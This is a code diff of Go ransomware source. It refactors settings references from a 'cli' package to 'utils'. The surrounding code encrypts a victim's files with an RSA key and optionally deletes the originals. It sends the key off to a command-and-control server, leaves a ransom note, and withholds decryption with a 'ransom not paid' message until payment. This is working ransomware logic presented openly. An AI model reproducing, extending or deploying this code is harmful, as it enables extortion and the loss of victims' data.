@@ -10,7 +10,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
-	"main/src/cli"
 	wcc "main/src/crypto"
 	"main/src/utils"
 	. "main/src/utils"
@@ -22,8 +21,8 @@ import (
 func generateClientKey() *rsa.PrivateKey {
 	var clientPrivateKey *rsa.PrivateKey
 	var err error
-	if cli.Settings.SuppliedClientPrivateKey != nil {
-		clientPrivateKey = cli.Settings.SuppliedClientPrivateKey
+	if utils.Settings.SuppliedClientPrivateKey != nil {
+		clientPrivateKey = utils.Settings.SuppliedClientPrivateKey
 	} else {
 		clientPrivateKey, err = rsa.GenerateKey(rand.Reader, 2048)
 		if err != nil {
@@ -50,7 +49,7 @@ func StartEncryption(q *Queue, key string) int {
 		go func() {
 			defer wg.Done()
 			wcc.EncryptFile(file, "", clientPublicKey)
-			if cli.Settings.Delete {
+			if utils.Settings.Delete {
 				os.Remove(file)
 			}
 		}()
@@ -59,7 +58,7 @@ func StartEncryption(q *Queue, key string) int {
 	if !keySendOffSuccessful || err != nil {
 		ioutil.WriteFile("./e_key.txt", []byte(encryptedPrivateKeyBytes), 0777)
 	}
-	if cli.Settings.LeaveNote {
+	if utils.Settings.LeaveNote {
 		leaveRansomNote(key)
 	}
 	return 0
@@ -67,7 +66,7 @@ func StartEncryption(q *Queue, key string) int {
 
 func StartDecryption(q *Queue, key string) int {
 	var clientPrivateKeyBytes []byte
-	if cli.Settings.RawKey {
+	if utils.Settings.RawKey {
 		rClientPrivateKeyBytes, fe := ioutil.ReadFile("./raw_key.bin")
 		if fe != nil {
 			log.Fatal(fe.Error())
@@ -76,15 +75,15 @@ func StartDecryption(q *Queue, key string) int {
 	} else {
 		var hash []byte
 		var err error
-		if len(cli.Settings.DecryptionHash) > 0 {
-			hash = []byte(cli.Settings.DecryptionHash)
+		if len(utils.Settings.DecryptionHash) > 0 {
+			hash = []byte(utils.Settings.DecryptionHash)
 		} else {
 			hash, err = ioutil.ReadFile("./decryption_hash.bin")
 			if err != nil {
 				log.Fatal("Failed to read the hash for key retrival")
 			}
 		}
-		keyHex, err := RetriveKeyByHash(string(hash), cli.Settings.OfflineMode)
+		keyHex, err := RetriveKeyByHash(string(hash), utils.Settings.OfflineMode)
 		if err != nil {
 			if err.Error() == "ransom not paid" {
 				fmt.Println("The ransom is currently not paid. If you made the payment there could be some processing delays so patience is adviced")
@@ -118,7 +117,7 @@ func StartDecryption(q *Queue, key string) int {
 		go func() {
 			defer wg.Done()
 			wcc.DecryptFile(file, clientPrivateKey)
-			if cli.Settings.Delete {
+			if utils.Settings.Delete {
 				os.Remove(file)
 			}
 		}()
@@ -146,11 +145,11 @@ func handleClientKey(pubKeyBytes []byte, clientPrivateKey *rsa.PrivateKey, flag 
 		return "", errors.New("Failed to encrypt client private key")
 	}
 	privateKeyBytes := x509.MarshalPKCS1PrivateKey(clientPrivateKey)
-	if cli.Settings.RawKey {
+	if utils.Settings.RawKey {
 		ioutil.WriteFile("./raw_key.bin", x509.MarshalPKCS1PrivateKey(clientPrivateKey), 0777)
 	} else {
 		var resp bool
-		resp, err = utils.SendOffKey(hex.EncodeToString(encryptedClientPrivateKey), wcc.GetHash(privateKeyBytes), cli.Settings.PaidStatus, cli.Settings.OfflineMode)
+		resp, err = utils.SendOffKey(hex.EncodeToString(encryptedClientPrivateKey), wcc.GetHash(privateKeyBytes), utils.Settings.PaidStatus, utils.Settings.OfflineMode)
 		ioutil.WriteFile("./decryption_hash.bin", []byte(wcc.GetHash(privateKeyBytes)), 0777)
 		if err != nil || !resp {
 			log.Println("Failed to contact Command And Control server")
